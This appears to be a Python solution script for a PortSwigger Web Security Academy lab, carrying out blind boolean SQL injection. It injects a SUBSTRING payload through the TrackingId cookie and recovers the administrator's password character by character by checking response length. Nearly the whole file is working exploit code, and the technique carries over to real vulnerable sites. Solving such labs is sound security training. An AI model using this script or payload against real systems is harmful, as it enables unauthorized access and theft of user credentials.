#This will extract the passwords one by one if you know the full length of the password from password_length.py
import requests
import string

url = "https://0a4d003d03b8ef9381cf6191006700e4.web-security-academy.net/"
pass_char = string.ascii_lowercase + string.digits

#Crafting the method
def requestLab(url, payload):
    cookies = {
        "TrackingId":"kx7OnRsyLphvFeC8"+payload,
        "session":"812WF8JTV7ax0LedTOGcRp6LzfCgF0AG"
    }
    r = requests.get(url, cookies=cookies)
#checking the response length for debugging
    #print("Response length:", len(r.text))
    return r.text

#Inserting the payload
pchar = ''
for i in range(1,21):
    for c in pass_char:
        PAYLOAD = (f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{c}")
        if len(requestLab(url, PAYLOAD)) == 11554:
            pchar += c
            print("Found a new char:", pchar)
            break
        
print("Password found:", pchar)
